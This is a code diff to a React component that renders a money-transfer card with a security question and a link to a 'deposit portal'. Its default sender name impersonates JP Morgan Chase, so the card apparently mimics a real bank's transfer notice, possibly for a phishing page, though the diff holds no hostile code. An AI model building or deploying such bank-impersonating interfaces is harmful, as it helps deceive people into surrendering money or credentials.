@@ -12,6 +12,8 @@ interface TransferCardProps {
   transferId?: string
   date?: string
   senderName?: string
+  recipient?: string
+  recipientName?: string
   details?: Array<{ label: string; value: string }>
 }
 
@@ -19,10 +21,12 @@ export function TransferCard({
   amount,
   message,
   securityQuestion,
-  depositLink = "{buildDepositUrl()",
+  depositLink,
   transferId,
   date = new Date().toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" }),
   senderName = "JP Morgan Chase Bank | Global Payments System",
+  recipient,
+  recipientName,
   details,
 }: TransferCardProps) {
   const [showSecurityAnswer, setShowSecurityAnswer] = useState(false)
@@ -31,13 +35,18 @@ export function TransferCard({
   const safeAmount = amount ?? 0
 
   const buildDepositUrl = () => {
+    // Use the depositLink from the email if available; otherwise build one dynamically
+    if (depositLink) return depositLink
     const params = new URLSearchParams({
       transferId: transferId || "",
       amount: safeAmount.toString(),
-      senderName: senderName,
+      recipient: recipient || "",
+      recipientName: recipientName || "",
+      bankName: "Banking System",
+      message: message || "",
       timestamp: new Date().toISOString(),
     })
-    return `/deposit-portal?${params.toString()}`
+    return `/deposit-portal/client?${params.toString()}`
   }
 
   return (
